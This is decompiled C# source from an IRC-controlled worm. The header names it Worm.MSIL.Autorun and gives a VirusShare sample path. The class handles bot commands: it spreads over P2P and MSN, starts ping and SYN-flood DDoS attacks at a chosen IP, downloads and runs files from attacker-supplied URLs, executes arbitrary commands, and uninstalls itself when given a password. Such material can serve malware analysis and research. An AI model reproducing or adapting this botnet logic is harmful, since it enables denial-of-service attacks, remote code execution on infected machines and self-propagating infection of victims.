// Decompiled with JetBrains decompiler
// Type: explorer.basecommandlist
// Assembly: explorer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 56E5CD67-A795-400A-AA93-F7890471D495
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Worm.MSIL.Autorun.ig-2c86700b4d3a736629e63a7f91f6e488e611145530107c5a2b53ad8867079764.exe

using spreading;
using System.Diagnostics;
using System.Threading;

namespace explorer
{
  internal class basecommandlist : commandlist
  {
    public override void p2p(irc irc)
    {
      try
      {
        P2P.Start();
        irc.teller.tell(config.channel, "Spreading-P2P", config.language_spreading_p2p_success, false, true, false);
      }
      catch
      {
        irc.teller.tell(config.channel, "Spreading-P2P", config.language_spreading_p2p_error, true, false, false);
      }
    }

    public override void pingstop(irc irc)
    {
      if (Ping.running)
      {
        Ping.stop();
        irc.teller.tell(config.channel, "DDoS", config.language_ping_stopped.Replace("%ip%", Ping.ip).Replace("%threads%", Ping.threads.ToString()), false, true, false);
      }
      else
        irc.teller.tell(config.channel, "DDoS", config.language_ping_notrunning, false, false, true);
    }

    public override void ping(irc irc, string message)
    {
      if (message.Contains(" "))
      {
        string[] strArray = message.Split(' ');
        if (strArray.Length == 2)
        {
          if (Ping.running)
          {
            irc.teller.tell(config.channel, "DDoS", config.language_ping_already.Replace("%ip%", Ping.ip).Replace("%threads%", Ping.threads.ToString()), false, false, true);
          }
          else
          {
            Ping.ip = strArray[0];
            Ping.threads = int.Parse(strArray[1]);
            Ping.start();
            irc.teller.tell(config.channel, "DDoS", config.language_ping_success.Replace("%ip%", Ping.ip).Replace("%threads%", Ping.threads.ToString()), false, true, false);
          }
        }
        else
          irc.teller.tell(config.channel, "DDoS", config.language_ping_error, true, false, false);
      }
      else
        irc.teller.tell(config.channel, "DDoS", config.language_ping_error, true, false, false);
    }

    public override void ssynstop(irc irc)
    {
      if (syn.IsEnabled)
      {
        irc.teller.tell(config.channel, "SSYN", config.language_ssyn_stopped.Replace("%ip%", syn.Host).Replace("%port%", syn.Port.ToString()).Replace("%threads%", syn.Threads.ToString()).Replace("%sockets%", syn.SuperSynSockets.ToString()), false, true, false);
        syn.StopSuperSyn();
        syn.IsEnabled = false;
      }
      else
        irc.teller.tell(config.channel, "SSYN", config.language_ssyn_notrunning, false, false, true);
    }

    public override void ssyn(irc irc, string message)
    {
      if (message.Contains(" "))
      {
        string[] strArray = message.Split(' ');
        if (strArray.Length == 4)
        {
          if (!syn.IsEnabled)
          {
            syn.Host = strArray[0];
            syn.Port = int.Parse(strArray[1]);
            syn.SuperSynSockets = int.Parse(strArray[2]);
            syn.Threads = int.Parse(strArray[3]);
            syn.StartSuperSyn();
            syn.IsEnabled = true;
            irc.teller.tell(config.channel, "SSYN", config.language_ssyn_success.Replace("%ip%", syn.Host).Replace("%port%", syn.Port.ToString()).Replace("%threads%", syn.Threads.ToString()).Replace("%sockets%", syn.SuperSynSockets.ToString()), false, true, false);
          }
          else
            irc.teller.tell(config.channel, "SSYN", config.language_ssyn_allready.Replace("%ip%", syn.Host).Replace("%port%", syn.Port.ToString()).Replace("%threads%", syn.Threads.ToString()).Replace("%sockets%", syn.SuperSynSockets.ToString()), false, false, true);
        }
        else
          irc.teller.tell(config.channel, "SSYN", config.language_ssyn_noparms, false, false, true);
      }
      else
        irc.teller.tell(config.channel, "SSYN", config.language_ssyn_noparms, false, false, true);
    }

    public override void msnstop(irc irc)
    {
      if (storage.msn_spreading != null)
      {
        irc.teller.tell(config.channel, "Spreading-MSN", config.language_spreading_msn_stopped_success, false, true, false);
        try
        {
          storage.msn_spreading.Suspend();
          storage.msn_spreading = (Thread) null;
        }
        catch
        {
        }
      }
      else
        irc.teller.tell(config.channel, "Spreading-MSN", config.language_spreading_msn_stopped_allready, false, false, true);
    }

    public override void msnstart(irc irc, string message) => new msn().spread(message, irc, config.channel);

    public override void version(irc irc, string user) => irc.sendPrivmsg(config.channel, config.version_message.Replace("%name%", config.name).Replace("%version%", config.version).Replace("%user%", user));

    public override void remove(irc irc, string pass, string user)
    {
      if (pass == config.cmd_remove_pass)
      {
        misc.setInfected(config.infecting_startup_name, config.infecting_startup_pathexe, false);
        misc.batRemove("OWNAGE.bat", config.infecting_startup_pathexe);
        irc.teller.tell(config.channel, "Remover", config.language_remove_success.Replace("%user%", user), false, true, false);
        this.exit(config.language_remove_quit.Replace("%user%", user), irc);
      }
      else
        irc.teller.tell(config.channel, "Remover", config.language_remove_password_error, true, false, false);
    }

    public override void download(irc irc, string parms, string nick)
    {
      if (parms.Contains(" "))
      {
        string[] strArray = parms.Split(' ');
        if (strArray.Length == 3)
        {
          if (!misc.download(strArray[0], strArray[1], irc))
            return;
          if (strArray[2] == "1")
          {
            irc.teller.tell(config.channel, "Download", config.language_download_success_run.Replace("%user%", nick).Replace("%url%", strArray[0]).Replace("%loc%", strArray[1]).Replace("%exe%", strArray[2]), false, true, false);
            misc.exec(strArray[1], irc);
          }
          else
            irc.teller.tell(config.channel, "Download", config.language_download_success_norun.Replace("%user%", nick).Replace("%url%", strArray[0]), false, true, false);
        }
        else
          irc.teller.tell(config.channel, "Download", config.language_download_error_noparms.Replace("%user%", nick), false, false, true);
      }
      else
        irc.teller.tell(config.channel, "Download", config.language_download_error_noparms.Replace("%user%", nick), false, false, true);
    }

    public override void exec(irc irc, string parms) => misc.exec(parms, irc);

    public override void about(irc irc, string channel)
    {
      string str1 = "\u0003" + config.about_forecolor.ToString() + "," + config.about_backcolor.ToString();
      string str2 = "\u0003" + config.about_fontcolor.ToString() + "," + config.about_backcolor.ToString();
      string str3 = "";
      string str4 = str1 + config.about_side_char;
      string str5 = str1 + config.about_side_char + str2;
      string str6 = str1 + config.about_side_char;
      string str7 = str4 + config.about_top_close + str6 + "\n";
      string str8 = str4 + config.about_top_close + str6;
      string str9 = str5 + misc.multipleChar(config.about_back_char, config.about_top_close.Length) + str6 + "\n";
      string str10 = str5 + misc.centerString(config.about_back_char, config.about_name.Replace("%version%", config.version).Replace("%name%", config.name), config.about_top_close.Length) + str6 + "\n";
      string str11 = str5 + misc.formatString(config.about_back_char + config.about_back_char, config.about_madeby, config.about_back_char, config.about_top_close.Length + 3).Replace("%emiel%", config.about_emiel).Replace("%dion%", config.about_dion) + str6 + "\n";
      string str12 = str3 + str7 + str9 + str10 + str9 + str11;
      if (config.about_ismod)
        str12 = str12 + str9 + str5 + misc.formatString(config.about_back_char + config.about_back_char, config.about_modby, config.about_back_char, config.about_top_close.Length) + str6 + "\n" + str5 + misc.formatString(config.about_back_char + config.about_back_char, config.about_ismodby, config.about_back_char, config.about_top_close.Length) + str6 + "\n";
      string str13 = str12 + str9 + str8;
      char[] chArray = new char[1]{ '\n' };
      foreach (string message in str13.Split(chArray))
        irc.sendPrivmsg(channel, message);
    }

    public override void say(string msg, irc irc) => irc.sendPrivmsg(config.channel, msg);

    public override void exit(irc irc)
    {
      irc.sendQuit();
      Thread.Sleep(1000);
      Process.GetCurrentProcess().Kill();
    }

    public override void exit(string reason, irc irc)
    {
      irc.sendQuit(reason);
      Thread.Sleep(1000);
      Process.GetCurrentProcess().Kill();
    }
  }
}
